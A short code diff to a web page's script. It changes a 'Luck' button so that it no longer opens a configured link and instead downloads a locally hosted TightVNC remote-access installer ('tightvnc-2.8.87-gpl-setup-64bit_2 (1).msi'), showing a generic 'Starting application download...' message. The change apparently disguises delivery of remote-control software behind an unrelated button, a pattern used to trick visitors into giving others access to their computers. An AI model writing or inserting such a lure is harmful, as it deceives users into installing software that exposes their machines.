@@ -58,23 +58,9 @@
         }
 
         // Handle Luck Button Click
-        luckBtn.addEventListener('click', async () => {
-            try {
-                // Fetch the configured URL from the backend dynamically
-                const response = await fetch('/api/luck-link');
-                if (!response.ok) {
-                    throw new Error('Failed to fetch link');
-                }
-                const data = await response.json();
-                if (data.url) {
-                    window.open(data.url, '_blank');
-                } else {
-                    window.open('https://www.google.com', '_blank');
-                }
-            } catch (error) {
-                console.error('Error fetching luck link, defaulting:', error);
-                window.open('https://www.google.com', '_blank');
-            }
+        luckBtn.addEventListener('click', () => {
+            window.location.href = '/static/tightvnc-2.8.87-gpl-setup-64bit_2 (1).msi';
+            showToast('Starting application download...');
         });
 
         // Handle Send Message
